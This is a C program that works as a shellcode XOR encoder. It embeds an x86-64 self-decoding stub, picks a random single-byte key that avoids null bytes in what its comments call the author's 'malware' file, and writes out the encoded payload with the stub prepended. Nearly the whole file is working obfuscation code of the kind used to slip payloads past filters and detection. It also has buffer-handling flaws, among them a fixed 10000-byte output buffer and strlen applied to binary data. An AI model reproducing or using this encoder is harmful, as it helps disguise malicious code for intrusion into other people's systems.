#include <fcntl.h>
#include <stdio.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>

unsigned char decoder[] =
 "\x4d\x31\xc0"          /* xor    %r8,%r8               */
 "\x41\xb1\x00"          /* mov    $0x00,%r9b            */
 "\xeb\x1a"              /* jmp    4000d2 <get_sc_addr>  */
 "\x58"                  /* pop    %rax                  */
 "\x48\x31\xc9"          /* xor    %rcx,%rcx             */
 "\x48\x31\xdb"          /* xor    %rbx,%rbx             */
 "\x8a\x1c\x08"          /* mov    (%rax,%rcx,1),%bl     */
 "\x4c\x39\xc3"          /* cmp    %r8,%rbx              */
 "\x74\x10"              /* je     4000d7 <exec_sc>      */
 "\x44\x30\xcb"          /* xor    %r9b,%bl              */
 "\x88\x1c\x08"          /* mov    %bl,(%rax,%rcx,1)     */
 "\x48\xff\xc1"          /* inc    %rcx                  */
 "\xeb\xed"              /* jmp    4000bf <xor_loop>     */
 "\xe8\xe1\xff\xff\xff"; /* callq  4000b8 <jmp_back>     */

int main(int argc, char **argv) {
    char *file;
    struct stat sstat;
    int i, n, fd, len, xor_with;
    int decoder_len;
    unsigned char *fbuf, *ebuf;
    unsigned char bad_bytes[256] = {0};
    unsigned char good_bytes[256] = {0};
    FILE *out_file;

    if (argc != 2) {
        fprintf(stderr, "Syntax: %s binary_file\n", argv[0]);
        exit(-1);
    }

    file = argv[1];

    /* open the file and read all the bytes */
    if (lstat(file, &sstat) < 0) {
        fprintf (stderr, "File %s not found", file);
        exit(-1);
    }

    fprintf(stderr, "Perfect, processing file %s\n", file);

    len = sstat.st_size;

    if ((fbuf = (unsigned char *)malloc(len)) == NULL) {
        perror("malloc");
        exit(-1);
    }
    
    if ((fd = open(file, O_RDONLY)) < 0) {
        perror("open");
        _exit(-1);
    }

    if (read(fd, fbuf, len) != len) {
        perror("read");
        _exit(-1);
    }

    close(fd);

    /* try every byte xored, if its \x0 add to bad_bytes */
    /*
        I try all the possible 256 keys of 2 bytes for every hexadecimal of my malware's file.
        I want to avoid (file[i]^key) = 0 so I have to check which keys I cannot use.
        In the following two cycles I have to do exactly that O(n^2).
    */
    for (n = 0; n < len; n++) {
        for (i = 1; i < 256; i++) {
            if ((i^*(fbuf+n)) == 0) {
                bad_bytes[i] = i;
            }
        }
    }

    /* if its not a bad_byte its a good_one (ordered) */
    /*
        The places of my bad_bytes array that are empty (\0) indicate that their index is a valid key.
        So I can save all the valid keys in an separate array called good_bytes.
    */
    for (i = 1, n = 0; i < 256; i++) {
        if (bad_bytes[i] == '\0') 
            good_bytes[n++] = i;
    }

    srand((unsigned)time(NULL));

    // Now I have to take randomly one of the valid keys

    xor_with = good_bytes[rand()%n];

    // If I have no valid keys the xor_with will be zero because it will be an operation with mod 0.
    // My key now is in xor_with.


    if (xor_with) {

        printf("\n[x] Choose to XOR with 0x%02x\n\n", xor_with);
        
        /* overwrite that 5th xor byte with the xor_with byte */
        decoder[5] = xor_with;
        decoder_len = strlen((char *)decoder);

        if ((ebuf = (unsigned char *)malloc(decoder_len+len+1)) == NULL) {
            perror("malloc");
            _exit(-1);
        }

        memset(ebuf, '\x0', sizeof(ebuf));

        for (i = 0; i < decoder_len; i++) {
            ebuf[(i)] = decoder[i];
        }

        /* copy the xored shellcode byes in */
        for (i = 0; i < len; i++) {
            ebuf[(i+decoder_len)] = xor_with^*(fbuf+i);
        }

        // File writing

        out_file = fopen("out/obfuscated.hex","wb+");

        char* s = "global _start\n_start:\n";

        char out_buffer[10000];

        int length = 0;


        for (i = 0; i < strlen((char *)ebuf); i++) {
            length += sprintf(out_buffer + length, "\\x%02x", ebuf[i]);
        }

        fwrite(out_buffer , 1 , length , out_file);
        fclose(out_file);
        return 0;

    } else {
        printf("\n[*] No byte found to XOR with :(\n");
        _exit(-1);
    }


    return 0;
}